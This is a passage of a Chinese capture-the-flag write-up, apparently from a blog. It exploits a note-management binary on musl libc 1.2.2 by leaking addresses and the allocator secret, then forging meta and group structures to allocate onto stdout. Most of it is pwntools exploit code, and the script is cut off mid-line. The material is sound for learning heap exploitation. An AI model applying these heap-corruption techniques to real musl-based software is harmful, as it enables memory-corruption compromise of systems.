__fastcall add(struct _IO_FILE *stderr)&#xA;{&#xA;  __int64 *heap_ptr; // [rsp&amp;#43;8h] [rbp-8h]&#xA;&#xA;  heap_ptr = (__int64 *)calloc(1u, 0x28u);&#xA;  heap_ptr[2] = create_name(heap_ptr);&#xA;  heap_ptr[3] = create_note(heap_ptr &amp;#43; 1);&#xA;  heap_ptr[4] = global_note;&#xA;  global_note = (__int64)heap_ptr;&#xA;  return puts(&amp;#34;ok&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall delete(struct _IO_FILE *stderr)&#xA;{&#xA;  // ...&#xA;  ptr_1 = 0;&#xA;  size = create_name((__int64 *)&amp;amp;ptr_1);&#xA;  ptr = (void *)find_name(ptr_1, size);&#xA;  if ( ptr )&#xA;  {&#xA;    if ( ptr != (void *)global_note || *(_QWORD *)(global_note &amp;#43; 0x20) )// 要删除的是中间或末尾节点&#xA;    {&#xA;      if ( *((_QWORD *)ptr &amp;#43; 4) )&#xA;      {                                         // 遍历链表找到指向ptr的前一个节点的next指针位置&#xA;        for ( p_global_note = &amp;amp;global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note &amp;#43; 32) )&#xA;          ;&#xA;        *p_global_note = *((_QWORD *)ptr &amp;#43; 4);  // 更新前一个节点的next指针，从链表中移除ptr&#xA;      }&#xA;    }&#xA;    else&#xA;    {&#xA;      global_note = 0;                          // 要删除的是头节点且没有后继节点&#xA;    }&#xA;    free(*(void **)ptr);                        // 释放name指针&#xA;    free(*((void **)ptr &amp;#43; 1));                  // 释放note_content指针&#xA;    free(ptr);                                  // 释放节点本身&#xA;    puts(&amp;#34;ok&amp;#34;);&#xA;  }&#xA;  else&#xA;  {&#xA;    puts(&amp;#34;oops.....&amp;#34;);&#xA;  }&#xA;  free(ptr_1);&#xA;  // ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;流程&#34;&gt;&lt;span&gt;流程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%b5%81%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;整体流程可以分为这三步：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;把堆块申请在&lt;code&gt;stdout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;第一步&#34;&gt;&lt;span&gt;第一步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在前面两步泄露地址中，只需要关注&lt;code&gt;active[2]&lt;/code&gt;这个链表（0x30大小）&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;一次，申请一个&lt;code&gt;0x30&lt;/code&gt;大小的&lt;code&gt;note1&lt;/code&gt;，来防止&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;group&lt;/code&gt;中所有&lt;code&gt;chunk&lt;/code&gt;时，将整个&lt;code&gt;group&lt;/code&gt;归还给堆管理器&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;接下来需要注意，&lt;code&gt;group&lt;/code&gt;对&lt;code&gt;chunk&lt;/code&gt;的管理策略：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;malloc&lt;/code&gt;的时候取的是&lt;code&gt;avail_mask&lt;/code&gt;中最低位的堆块，也就是一个&lt;code&gt;group&lt;/code&gt;中最低地址的堆块&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的堆块，会把它的&lt;code&gt;free_mask&lt;/code&gt;置1，&lt;code&gt;avail_mask&lt;/code&gt;不动还是0&lt;/li&gt;&#xA;&lt;li&gt;当一个&lt;code&gt;group&lt;/code&gt;中没有&lt;code&gt;avail&lt;/code&gt;堆块时，会把被&lt;code&gt;free&lt;/code&gt;的堆块标记成&lt;code&gt;avail&lt;/code&gt;，&lt;code&gt;free_mask&lt;/code&gt;就置0了&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;接着把&lt;code&gt;note2&lt;/code&gt;申请到&lt;code&gt;active[2]&lt;/code&gt;的第十个&lt;code&gt;chunk&lt;/code&gt;的位置，&lt;code&gt;note2_content&lt;/code&gt;申请到第二个的位置&lt;/p&gt;&#xA;&lt;p&gt;申请&lt;code&gt;note3&lt;/code&gt;，并把&lt;code&gt;note2&lt;/code&gt;给&lt;code&gt;free&lt;/code&gt;掉，此时&lt;code&gt;note3&lt;/code&gt;还记录着&lt;code&gt;note2&lt;/code&gt;的位置即第十个&lt;code&gt;chunk&lt;/code&gt;的位置&lt;/p&gt;&#xA;&lt;p&gt;接着在&lt;code&gt;note2_content&lt;/code&gt;的位置申请&lt;code&gt;note4&lt;/code&gt;，泄露出&lt;code&gt;note4&lt;/code&gt;记录的两个堆地址&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;musl申请的堆块，有的大小能泄露elfbase，有的能泄露libc&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #参考文章中，这里我本地不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 #调整了一下，我本地这个是对的&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第二步&#34;&gt;&lt;span&gt;第二步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;把原本&lt;code&gt;note2&lt;/code&gt;中执行&lt;code&gt;content&lt;/code&gt;的指针改成&lt;code&gt;malloc_context&lt;/code&gt;，&lt;code&gt;show&lt;/code&gt;即可&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# leak secret&#xA;for _ in range(6):&#xA;    find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第三步&#34;&gt;&lt;span&gt;第三步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;此时，能通过修改&lt;code&gt;note2_content&lt;/code&gt;来进行任意地址读和&lt;code&gt;free&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有了&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;、&lt;code&gt;secret&lt;/code&gt;，接下来就是把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，通过&lt;code&gt;puts&lt;/code&gt;打&lt;code&gt;IO&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，需要：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在&lt;code&gt;stdout-0x10&lt;/code&gt;伪造一个&lt;code&gt;group&lt;/code&gt;。通过&lt;code&gt;dequeue&lt;/code&gt;，在&lt;code&gt;stdout-0x10&lt;/code&gt;写上&lt;code&gt;fake_group_addr&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;利用&lt;code&gt;queue&lt;/code&gt; 把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;dequeue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;dequeue&lt;/code&gt;需要&lt;code&gt;fake_meta&lt;/code&gt;的构造：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;通过&lt;code&gt;get_meta()&lt;/code&gt; 所有&lt;code&gt;assert&lt;/code&gt;。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt;那个页的起始的&lt;code&gt;secret&lt;/code&gt;要等于&lt;code&gt;malloc_context&lt;/code&gt;的&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt; 中保存的 &lt;code&gt;group&lt;/code&gt; 指针要正确&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的&lt;code&gt;chunk&lt;/code&gt;的&lt;code&gt;index&lt;/code&gt;小于等于&lt;code&gt;fake_meta-&amp;gt;last_idx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nontrivial_free()&lt;/code&gt; 进入 第一个 if 分支。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;free_able == 1&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;伪造&lt;code&gt;prev&lt;/code&gt;、&lt;code&gt;next&lt;/code&gt;，通过&lt;code&gt;dequeue的unlink&lt;/code&gt;写&lt;code&gt;stdout-0x10&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;然后，通过任意地址&lt;code&gt;free&lt;/code&gt;，&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;fake_group&lt;/code&gt;的第一个&lt;code&gt;chunk&lt;/code&gt;，执行&lt;code&gt;dequeue&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;queue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;queue&lt;/code&gt;还是需要通过&lt;code&gt;get_meta&lt;/code&gt;的检查，然后就是走&lt;code&gt;nontrivial_free&lt;/code&gt;的&lt;code&gt;else_if&lt;/code&gt;分支：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;freeable == 0&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;这里&lt;code&gt;sc&lt;/code&gt;等于几就是进第几个&lt;code&gt;active&lt;/code&gt;链表，但是需要&lt;code&gt;sc&amp;lt;48&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着把&lt;code&gt;fake_meta-&amp;gt;mem&lt;/code&gt;改为&lt;code&gt;stdout-0x10&lt;/code&gt;即可把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上了&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = ELF(&amp;#34;../musl-libc/v1.2.2&amp;#34;)&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    # p = process([&amp;#34;/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2&amp;#34;,address])&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;&#xA;def cho(num):&#xA;    sla(&amp;#34;option: &amp;#34;,str(num))&#xA; &#xA;&#xA;def add(namesz, name, notesz, note):&#xA;    cho(1)&#xA;    sla(b&amp;#34;name size: &amp;#34;, str(namesz))&#xA;    # sla(b&amp;#34;name: &amp;#34;, name)&#xA;    sa(b&amp;#34;name: &amp;#34;, name)&#xA;    sla(b&amp;#34;note size: &amp;#34;, str(notesz))&#xA;    # sla(b&amp;#34;note content: &amp;#34;, note)&#xA;    sa(b&amp;#34;note content: &amp;#34;, note)&#xA; &#xA;def find(namesz,name):&#xA;    cho(2)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def delet(namesz,name):&#xA;    cho(3)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def remake():&#xA;    cho(4)&#xA;&#xA;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #这里不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 #调整了一下&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&#xA;&#xA;# calculate important addr&#xA;malloc_context = libcbase &amp;#43; 0xb4ac0&#xA;# mmap_base = libcbase - 0xa000&#xA;mmap_base = libcbase_true - 0x4000&#xA;fake_meta_addr = mmap_base &amp;#43; 0x2010&#xA;fake_mem_addr = mmap_base &amp;#43; 0x2040&#xA;# stdout = libcbase &amp;#43; 0xb4280   &#xA;stdout = libcbase_true &amp;#43; 0xdb2c0 &#xA;lg(&amp;#34;malloc_context&amp;#34;)&#xA;lg(&amp;#34;mmap_base&amp;#34;)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;lg(&amp;#34;fake_mem_addr&amp;#34;)&#xA;lg(&amp;#34;stdout&amp;#34;)&#xA;&#xA;# leak secret&#xA;for _ in range(6):&#xA;    